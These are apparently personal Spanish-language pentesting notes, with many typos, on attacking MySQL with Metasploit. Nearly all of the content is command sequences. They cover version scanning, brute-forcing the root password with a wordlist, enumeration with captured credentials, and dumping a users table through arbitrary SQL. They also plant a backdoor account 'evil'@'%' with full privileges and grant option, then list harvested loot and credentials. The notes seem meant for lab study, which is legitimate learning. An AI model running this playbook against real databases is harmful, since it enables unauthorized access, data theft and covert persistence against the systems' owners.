MySQL es un sistema de manedjo de BD relacionales en SQL (Sctructured Query Language)

Utiliza puerto TCP 3306 por defecto pero puede ser hosteado en cualquier otro puerto TCP abierto

Podemos utulizar modulos auxiliares de metasploit para hacer enumeracion de la version de MySQL, realizar fuerza bruta para determinar el password y ejecutas consultas SQL y mas

```
msfconsole
msf6>setg RHOSTS ip
msf6>setg RHOST ip
msf6>workscpace -a MYSQL_ENUM
msf6>workscpace 
msf6>search type:auxiliary name:sql
msf6>use auxiliary/scanner/mysql/mysql_version
msf6 auxiliary(scanner/mysql/mysql_version) >show options
msf6 auxiliary(scanner/mysql/mysql_version) >run  

```


Hacer Fuerza Bruta (normalmete se ataca al usuario roo)
```
msf6>search type:auxiliary name:mysql_login
msf6>use auxiliary/scanner/mysql/mysql_login
msf6 auxiliary(scanner/mysql/mysql_login) >show options
msf6 auxiliary(scanner/mysql/mysql_login) >set USERNAME root
msf6 auxiliary(scanner/mysql/mysql_login) >set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
msf6 auxiliary(scanner/mysql/mysql_login) >set VERBOSE false
msf6 auxiliary(scanner/mysql/mysql_login) >run
```


Para realizar la enumeracion ya teniendo las credenciales de acceso
Requiere credenciales de acceso 
```
msf6>search mysql_enum
msf6>use auxiliary/scanner/mysql/mysql_enum
msf6 auxiliary(scanner/mysql/mysql_enum) >show options
msf6 auxiliary(scanner/mysql/mysql_enum) >set USERNAM root
msf6 auxiliary(scanner/mysql/mysql_enum) >set PASSWORD pass12345 
msf6 auxiliary(scanner/mysql/mysql_enum) >run
msf6 auxiliary(scanner/mysql/mysql_enum) >
```

Siquiete modulo nos permite interactuar con la BD rirectamente, requiere credenciales de acceso
```
msf6>search mysql_sql
msf6>use auxiliary/admin/mysql/mysql_sql
msf6 auxiliary(admin/mysql/mysql_sql) >show options
msf6 auxiliary(admin/mysql/mysql_sql) >set USERNAM root
msf6 auxiliary(admin/mysql/mysql_sql) >set PASSWORD pass12345 
#Ejecutar consultas meidiante SQL
msf6 auxiliary(admin/mysql/mysql_sql) >
msf6 auxiliary(admin/mysql/mysql_sql) >run
msf6 auxiliary(admin/mysql/mysql_sql) >show options
msf6 auxiliary(admin/mysql/mysql_sql) >set SQL show databases;
msf6 auxiliary(admin/mysql/mysql_sql) >run #Ejecuta el  comando anterior y muestra las bd en el SRV

msf6 auxiliary(admin/mysql/mysql_sql) >set SQL use videos #nombre de la bd que obtivimos en paso anterior
#Este comando no retorna nada solo selecciona la  base de datos y luego podemos mostrar los tablas

msf6 auxiliary(admin/mysql/mysql_sql) >set SQL show tables;
msf6 auxiliary(admin/mysql/mysql_sql) >run


msf6 auxiliary(admin/mysql/mysql_sql) >set SQL show columns from nombre_de_tabla;
msf6 auxiliary(admin/mysql/mysql_sql) >run

msf6 auxiliary(admin/mysql/mysql_sql) >set SQL select * from usuarios;
msf6 auxiliary(admin/mysql/mysql_sql) >run
msf6 auxiliary(admin/mysql/mysql_sql) >set SQL CREATE USER 'evil'@'%' IDENTIFIED BY '1234';
msf6 auxiliary(admin/mysql/mysql_sql) >run
msf6 auxiliary(admin/mysql/mysql_sql) >set SQL GRANT ALL PRIVILEGES ON *.* TO 'evil'@'%' WITH GRANT OPTION;
msf6 auxiliary(admin/mysql/mysql_sql) >run
```

Para saber mas informacion del esquema de la base de datos tenemos otro modulo 

```
msf6>search mysql_schema
msf6>use auxiliary/scanner/mysql/mysql_schema
msf6 auxiliary(scanner/mysql/mysql_schema) >show options
msf6 auxiliary(scanner/mysql/mysql_schema) >set USERNAME root
msf6 auxiliary(scanner/mysql/mysql_schema) >set PASSWORD pass12345 
msf6 auxiliary(scanner/mysql/mysql_schema) >run
```

```
msf6 auxiliary(scanner/mysql/mysql_schema)>hosts #Muestra inf del host
msf6 auxiliary(scanner/mysql/mysql_schema)>services #Muestra info del servicio
msf6 auxiliary(scanner/mysql/mysql_schema)>loot #Muestra la información recopilada automáticamente por 
msf6 auxiliary(scanner/mysql/mysql_schema)>creds #Muestra las credenciales obtenidas por msf
```
